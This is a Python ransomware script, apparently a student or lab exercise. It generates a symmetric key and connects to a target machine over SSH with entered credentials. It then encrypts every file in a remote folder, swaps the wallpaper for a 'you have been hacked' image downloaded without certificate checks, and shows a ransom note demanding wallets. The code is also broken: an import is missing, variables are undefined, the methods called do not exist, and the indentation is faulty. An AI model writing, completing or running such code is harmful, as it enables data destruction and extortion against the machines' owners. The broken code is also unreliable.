# Sierra Maldonado
#!/usr/bin/env python3
import os
import datetime
import urllib.request
import ssl
import subprocess
from cryptography.fernet import Fernet

# Functions to write key and load key
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()


class Ransomware:
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            write_key()
        self.key = load_key()

    # Encrypt all files in a folder on a different VM
    def encrypt_folder_on_vm(self, target_vm_ip, folder_path):
        # Establish an SSH connection with the target VM
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_vm_ip, username=ssh, password=word)

        # Iterate over the files in the folder on the target VM and encrypt them
        sftp = ssh.open_sftp()
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with sftp.open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                encrypted = fernet.encrypt(data)

                with sftp.open(file_path, 'wb') as f:
                    f.write(encrypted)

        # Close the SSH connection
        sftp.close()
        ssh.close()

    # Decrypt files using the Fernet symmetric key
 def decrypt_folder_on_vm(self, target_vm_ip, folder_path):
        # Establish an SSH connection with the target VM
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_vm_ip, username=ssh, password=word)

        # Iterate over the files in the folder on the target VM and decrypt them
        sftp = ssh.open_sftp()
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with sftp.open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                decrypted = fernet.decrypt(data)

                with sftp.open(file_path, 'wb') as f:
                    f.write(decrypted)

        # Close the SSH connection
        sftp.close()
        ssh.close()

    # Change Background (modify for Linux)
    def change_background(self):
        # Modify the code to change the wallpaper on your Linux distribution
        # Update the image URL and path accordingly
        image_url = "https://www.unigamesity.com/wp-content/uploads/2009/05/you-have-been-hacked.jpg"
        path = "/path/to/wallpaper.jpg"
        context = ssl._create_unverified_context()
        with urllib.request.urlopen(image_url, context=context) as u, open(path, 'wb') as f:
            f.write(u.read())
        # Modify the code to change the wallpaper on your Linux distribution
        # Update the command accordingly
        command = "command_to_change_wallpaper"  # Replace with the actual command
        subprocess.run(command, shell=True)

    # Linux Popup blocker (modify for Linux)
    def ransom_note(self):
        # Modify the code to display a notification or custom dialog on Linux
        # Replace the text with your own ransom note
        ransom_note_text = "You have been bamboozeled by the Black Fox Bandits, Please hand over your wallets"
        command = f"notify-send 'Ransom Note' '{ransom_note_text}'"  # Replace with the actual command
        subprocess.run(command, shell=True)

    def attack_windows_server(self):
        target_ip = input
        while True:
            user_input = input("What would you like to do? (Encrypt, Pop-up, Background, Decrypt, or Exit): ")
            if user_input.lower() == "encrypt":
                # Encryption
                ssh = input("Username: ")
                word = input("Password: ")
                self.encrypt_file()

            elif user_input.lower() == "pop-up":
                # Display ransom note on Windows Server (modify for Linux)
                self.ransom_note()

            elif user_input.lower() == "background":
                # Change Windows Server background (modify for Linux)
                self.change_background()

            elif user_input.lower() == "decrypt":
                # Decryption
                ssh = input("Username: ")
                word = input("Password: ")
                self.decrypt_file()

            elif user_input.lower() == "exit":
                break

ransomware = Ransomware()
ransomware.attack_windows_server()
